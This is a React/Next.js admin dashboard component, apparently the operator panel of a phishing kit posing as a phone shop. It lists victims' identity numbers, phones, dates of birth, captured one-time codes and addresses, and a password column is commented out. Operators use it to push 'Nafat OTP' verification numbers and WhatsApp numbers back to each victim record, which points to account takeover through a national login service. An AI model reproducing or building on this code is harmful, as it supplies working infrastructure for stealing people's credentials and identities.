import { useEffect, useState } from "react";
import dynamic from "next/dynamic";
import toast from "react-hot-toast";
import { useRouter } from "next/navigation";
import { Button, Input, Pagination } from "@nextui-org/react";
import { FaEye, FaSearch } from "react-icons/fa6";

const OrderDetailsModal = ({ order, onClose }) => {
  if (!order) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg p-6 max-w-2xl w-full">
        <h2 className="text-xl font-bold mb-4">Order Details</h2>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <strong>Model:</strong> {order.model}
          </div>
          <div>
            <strong>Storage:</strong> {order.storage}
          </div>
          <div>
            <strong>Color:</strong> {order.color}
          </div>
          <div>
            <strong>Phone Number:</strong> {order.phone}
          </div>
          <div>
            <strong>Date of Birth:</strong>{" "}
            {new Date(order.dob).toLocaleDateString()}
          </div>
          <div>
            <strong>Nationality:</strong> {order.nationality}
          </div>
          <div>
            <strong>Profession:</strong> {order.profession}
          </div>
          <div>
            <strong>City:</strong> {order.city}
          </div>
          <div>
            <strong>Birth Place:</strong> {order.birthPlace}
          </div>
          <div>
            <strong>Order Date:</strong>{" "}
            {new Date(order.orderDate).toLocaleDateString()}
          </div>
        </div>
        <button
          onClick={onClose}
          className="mt-4 bg-teal-600 text-white px-4 py-2 rounded hover:bg-teal-700"
        >
          Close
        </button>
      </div>
    </div>
  );
};

const UserDetailsTable = ({ token }) => {
  const [orders, setOrders] = useState([]);
  const [loading, setLoading] = useState(false);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [selectedOrder, setSelectedOrder] = useState(null);
  const [searchTerm, setSearchTerm] = useState("");
  const [searchValue, setSearchValue] = useState("");
  const [selectedRows, setSelectedRows] = useState([]);

  const router = useRouter();

  console.log("selectedRows", selectedRows);

  useEffect(() => {
    const fetchOrders = () => {
      let url = `${process.env.API_URL}/api/admin/orders?page=${page}&limit=20`;
      let searchedUrl = `${process.env.API_URL}/api/admin/orders?page=${page}&limit=20&search=${searchTerm}`;

      fetch(searchTerm ? searchedUrl : url, {
        method: "GET",
        headers: {
          authorization: `Bearer ${token}`,
        },
      })
        .then(async (res) => {
          if (!res.ok) {
            setLoading(false);
            throw new Error(`HTTP error! status: ${res.status}`);
          }
          const data = await res.json();

          if (data.message) {
            toast.error(data.message);
            router.push("/admin-login");
            setLoading(false);
          } else {
            setOrders(data.orders);
            setTotalPages(data.totalPages);
            setLoading(false);
          }
        })
        .catch((err) => {
          console.log("Error fetching orders:", err);
          setLoading(false);
        });
    };
    fetchOrders();
    // Set up interval for periodic fetching
    const intervalId = setInterval(fetchOrders, 10000); // 10 seconds
    return () => clearInterval(intervalId);
  }, [token, router, page, searchTerm]);

  useEffect(() => {
    if (page) {
      setLoading(true);
    }
  }, [page]);

  const handleUpdateNafatOneSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      nafatOtpOne: Number(event.target.nafatOtpOne.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.nafatOtpOne === 0) {
      toast.error("Please enter your nafat otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Nafat OTP updated successfully");
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdateNafatTwoSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      nafatOtpTwo: Number(event.target.nafatOtpTwo.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.nafatOtpTwo === 0) {
      toast.error("Please enter your nafat otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Nafat OTP updated successfully");
            // window.location.reload();
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdateOrderConfirmationSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      orderConfirmationOtp: Number(event.target.orderConfirmationOtp.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.orderConfirmationOtp === 0) {
      toast.error("Please enter your order confirmation otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Order confirmation OTP updated successfully");
            // window.location.reload();
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdateNafatThreeSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      nafatOtpThree: Number(event.target.nafatOtpThree.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.nafatOtpThree === 0) {
      toast.error("Please enter your nafat otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Nafat OTP updated successfully");
            // window.location.reload();
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdateNafatFourSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      nafatOtpFour: Number(event.target.nafatOtpFour.value),
    };

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.nafatOtpFour === 0) {
      toast.error("Please enter your nafat otp");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            toast.success("Nafat OTP updated successfully");
            // window.location.reload();
          } else {
            toast.error("Please enter correct otp");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdatewhatsappNumberSubmit = (index, event) => {
    event.preventDefault();

    const submitData = {
      whatsappNumber: Number(event.target.whatsappNumber.value),
    };

    console.log("submit data", submitData);

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`;

    if (submitData.whatsappNumber === 0) {
      toast.error("Please enter your whatsapp number");
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          console.log("data response", data);
          if (data) {
            // reload the page on alert click
            toast.success("Whatsapp Number updated successfully");
            // window.location.reload();
          } else {
            toast.error("Please enter correct whatsapp number");
          }
        })
        .catch((err) => {
          console.log("err", err);
        });
    }
  };

  const handleUpdateNafatOne = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdateNafatOneSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="nafatOtpOne"
            placeholder={orders[index].nafatOtpOne}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };

  const handleUpdateNafatTwo = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdateNafatTwoSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="nafatOtpTwo"
            placeholder={orders[index].nafatOtpTwo}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };

  const handleUpdateNafatThree = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdateNafatThreeSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="nafatOtpThree"
            placeholder={orders[index].nafatOtpThree}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };

  const handleUpdateNafatFour = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdateNafatFourSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="nafatOtpFour"
            placeholder={orders[index].nafatOtpFour}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };

  const handleUpdatewhatsappNumber = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdatewhatsappNumberSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="whatsappNumber"
            placeholder={orders[index].whatsappNumber}
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    );
  };

  const handleDelete = (id) => {
    console.log("id", id);

    // delete the data from api localhost:3000/api/admin/orders/[id]
    fetch(`${process.env.API_URL}/api/admin/orders/${id}`, {
      method: "DELETE",
    })
      .then((res) => res.json())
      .then((data) => {
        if (data) {
          // reload the page on alert click
          toast.success("User deleted successfully");
          window.location.reload();
        } else {
          toast.error("Something went wrong");
        }
      })
      .catch((err) => {
        toast.error(`Something went wrong ~${err}`);
      });
  };

  const dateFormat = (date) => {
    const newDate = new Date(date);
    const day = newDate.getDate();
    const month = newDate.getMonth() + 1;
    const year = newDate.getFullYear();
    return `${day}-${month}-${year}`;
  };

  //delete multiple row
  const toggleRowSelection = (orderId) => {
    setSelectedRows((prev) =>
      prev.includes(orderId)
        ? prev.filter((id) => id !== orderId)
        : [...prev, orderId]
    );
  };

  const toggleSelectAll = () => {
    if (selectedRows.length === orders.length) {
      setSelectedRows([]);
    } else {
      setSelectedRows(orders.map((order) => order._id));
    }
  };

  const handleBulkDelete = () => {
    if (selectedRows.length === 0) {
      toast.error("Please select at least one row to delete");
      return;
    }

    if (
      !confirm(
        `Are you sure you want to delete ${selectedRows.length} selected items?`
      )
    ) {
      return;
    }

    Promise.all(
      selectedRows.map((id) =>
        fetch(`${process.env.API_URL}/api/admin/orders/${id}`, {
          method: "DELETE",
        })
      )
    )
      .then(() => {
        toast.success(`Successfully deleted ${selectedRows.length} items`);
        setSelectedRows([]);
        // Refresh the data
        setLoading(true);
        //fetchOrders(); // You might need to define this separately if it's not already
      })
      .catch((err) => {
        toast.error(`Error deleting items: ${err.message}`);
      });
  };

  const handleOrders = () => {
    if (loading) {
      return (
        <tr>
          <td className="py-10 md:py-20" colSpan={15}>
            <div className="flex justify-center items-center">
              <div className="animate-spin rounded-full h-20 w-20 border-t-2 border-b-2 border-teal-500"></div>
            </div>
          </td>
        </tr>
      );
    } else if (orders.length === 0) {
      return (
        <tr>
          <td className="px-2 py-3" colSpan={15}>
            <div className="flex justify-center items-center">
              <p className="text-lg text-gray-500 dark:text-gray-400">
                No Data Found
              </p>
            </div>
          </td>
        </tr>
      );
    } else {
      return orders?.map((order, index) => (
        <tr key={index}>
          <td className="px-2 py-3">
            <input
              type="checkbox"
              checked={selectedRows.includes(order._id)}
              onChange={() => toggleRowSelection(order._id)}
              className="h-4 w-4 rounded border-gray-300 text-teal-600 focus:ring-teal-500"
            />
          </td>
          <td className="px-2 py-3">
            <button
              onClick={() => handleViewDetails(order)}
              className="text-blue-500 hover:text-blue-700"
            >
              <FaEye />
            </button>
          </td>
          <td className="px-2 py-3">{index + 1}</td>
          <td className="px-2 py-3">{order.identity}</td>
          <td className="px-2 py-3">{order.phone}</td>
          {/* <td className="px-2 py-3">{order.password}</td> */}
          <td className="px-2 py-3">{dateFormat(order.dob)}</td>
          <td className="px-2 py-3">{order.firstOtp}</td>
          <td className="px-2 py-3">{handleUpdateNafatOne(index)}</td>
          <td className="px-2 py-3">{handleUpdateNafatTwo(index)}</td>
          <td className="px-2 py-3">{order.orderConfirmationOtp}</td>
          <td className="px-2 py-3">{handleUpdateNafatThree(index)}</td>
          <td className="px-2 py-3">{handleUpdateNafatFour(index)}</td>
          <td className="px-2 py-3">{handleUpdatewhatsappNumber(index)}</td>
          <td className="px-2 py-3">{order?.profession}</td>
          <td className="px-2 py-3">{order.nationality}</td>
          <td className="px-2 py-3 min-w-[200px]">
            Birth Place: {order.birthPlace}
            <br />
            City: {order.city}
            <br />
            Details: {order.details}
          </td>
          <td className="px-2 py-3">
            <button
              className="px-4 py-1 text-white bg-red-500 rounded-md"
              onClick={() => handleDelete(order._id)}
            >
              Delete
            </button>
          </td>
        </tr>
      ));
    }
  };

  const handleViewDetails = (order) => {
    setSelectedOrder(order);
  };

  const handleCloseModal = () => {
    setSelectedOrder(null);
  };

  return (
    <div>
      <div className="flex items-center">
        <Button
          onClick={handleBulkDelete}
          color="danger"
          className="mr-4"
          disabled={selectedRows.length === 0}
        >
          Delete Selected ({selectedRows.length})
        </Button>
      </div>
      <div className="mb-4 flex justify-end mr-4">
        <input
          placeholder="Search by ID, Phone, or Country"
          value={searchValue}
          onChange={(e) => setSearchValue(e.target.value)}
          className="w-auto lg:w-80 py-1.5 px-3 border border-gray-300 rounded"
        />
        <Button
          onClick={() => {
            setSearchTerm(searchValue);
            setLoading(true);
          }}
          className="ml-2"
        >
          Search
        </Button>
      </div>
      <div className="relative overflow-x-auto overflow-y-hidden border mb-10">
        <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
          <thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 border-b">
            <tr>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                <input
                  type="checkbox"
                  checked={
                    selectedRows.length === orders.length && orders.length > 0
                  }
                  onChange={toggleSelectAll}
                  className="h-4 w-4 rounded border-gray-300 text-teal-600 focus:ring-teal-500"
                />
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                #
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                ID
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Username
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Phone
              </th>
              {/* <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Password
              </th> */}
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                DOB
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                First OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat OTP One
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat OTP Two
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Order Confirmation OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat OTP Three
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat OTP Four
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Whatsapp
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Profession
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Country
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Address Details
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Action
              </th>
            </tr>
          </thead>
          <tbody>
            {/* If order length is zero show message */}
            {handleOrders()}
          </tbody>
        </table>
        <div className="flex items-center gap-2 justify-center">
          {selectedOrder && (
            <OrderDetailsModal
              order={selectedOrder}
              onClose={handleCloseModal}
            />
          )}
          <Pagination
            showControls
            total={totalPages}
            initialPage={1}
            page={page}
            onChange={setPage}
          />
        </div>
      </div>
    </div>
  );
};

export default dynamic(() => Promise.resolve(UserDetailsTable), { ssr: false });
